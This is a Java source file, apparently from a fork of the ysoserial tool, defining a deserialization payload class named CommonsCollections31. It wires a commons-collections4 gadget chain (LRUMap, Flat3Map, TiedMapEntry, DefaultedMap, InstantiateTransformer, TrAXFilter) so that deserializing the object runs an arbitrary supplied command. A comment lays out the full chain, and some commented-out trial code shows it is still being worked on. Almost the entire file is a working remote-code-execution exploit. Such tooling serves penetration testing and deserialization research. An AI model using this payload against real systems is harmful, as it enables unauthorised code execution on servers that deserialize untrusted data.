package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.DefaultedMap;
import org.apache.commons.collections4.map.Flat3Map;
import org.apache.commons.collections4.map.LRUMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.util.Hashtable;
import java.util.Map;

/*
    Cluster2_20220605-162453.txt, fourth chain.
    Gadget chain:

		chain_LRUMap4-readObject-5cbb944e7592cec53c25c8a062c120dfc39dfd47.txt
			[
		 <org.apache.commons.collections4.map.LRUMap: void readObject(java.io.ObjectInputStream)>
		 <org.apache.commons.collections4.map.LRUMap: void doReadObject(java.io.ObjectInputStream)>
		 <org.apache.commons.collections4.map.AbstractHashedMap: void doReadObject(java.io.ObjectInputStream)>
		 <org.apache.commons.collections4.map.AbstractHashedMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
		 <org.apache.commons.collections4.map.AbstractHashedMap: boolean isEqualKey(java.lang.Object,java.lang.Object)>
		 <org.apache.commons.collections4.map.Flat3Map: boolean equals(java.lang.Object)>
		 <org.apache.commons.collections4.keyvalue.TiedMapEntry: boolean equals(java.lang.Object)>
		 <java.util.Hashtable: boolean equals(java.lang.Object)>
		 <org.apache.commons.collections4.map.DefaultedMap: java.lang.Object get(java.lang.Object)>
		 <org.apache.commons.collections4.functors.InvokerTransformer: java.lang.Object transform(java.lang.Object)>
		 <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>
		]
 */

@Dependencies({ "org.apache.commons:commons-collections4:4.0" })
@Authors({ "BadagliaccaDaniele" })
public class CommonsCollections31 extends PayloadRunner
    implements ObjectPayload<LRUMap> {

    public LRUMap getObject(final String command) throws Exception {

        Object templates = Gadgets.createTemplatesImpl(command);

        ConstantTransformer constant = new ConstantTransformer(String.class);

        // mock method name until armed
        Class[] paramTypes = new Class[] { String.class };
        Object[] args = new Object[] { "foo" };
        InstantiateTransformer instantiate = new InstantiateTransformer(
            paramTypes, args);

        // grab defensively copied arrays
        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
        args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

        ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });

        LRUMap lruMap = new LRUMap();

        Hashtable hashtable1 = new Hashtable();
        hashtable1.put("yy", 1);
        TiedMapEntry tiedMapEntry1 = new TiedMapEntry(hashtable1, chain);
        Flat3Map flat3Map1 = new Flat3Map();
        flat3Map1.put(tiedMapEntry1, 2);

        Hashtable hashtable2 = new Hashtable();
        hashtable2.put("zZ", 1); // it should have a level less, so no Flat3Map or not TiedMap, in this way it could be
        // possible to reach Hashtable in the TiedMapEntry.equals. Or maybe we should put DefaultedMap at the bottom
        // instead of Hashtable (let's try this one)
        //TiedMapEntry tiedMapEntry2 = new TiedMapEntry(hashtable2, chain);
        //Flat3Map flat3Map2 = new Flat3Map();
        //flat3Map2.put(tiedMapEntry2, 2);
        //DefaultedMap<String,Integer> defaultedMap = (DefaultedMap) DefaultedMap.<Map,Transformer>defaultedMap(flat3Map2, (Transformer<Integer,String>)chain);
        DefaultedMap<String,Integer> defaultedMap = (DefaultedMap) DefaultedMap.<Map,Transformer>defaultedMap(hashtable2, (Transformer<Integer,String>)chain);

        TiedMapEntry tiedMapEntry2 = new TiedMapEntry(defaultedMap, chain);
        Flat3Map flat3Map2 = new Flat3Map();
        flat3Map2.put(tiedMapEntry2, 2);

        //lruMap.put(defaultedMap, "a");
        //lruMap.put(flat3Map1, "b");
        lruMap.put(flat3Map2, "a");
        lruMap.put(flat3Map1, "b");

        // swap in values to arm
        Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
        paramTypes[0] = Templates.class;
        args[0] = templates;

        Reflections.setFieldValue(defaultedMap, "value", chain);

        return lruMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections31.class, args);
    }
}
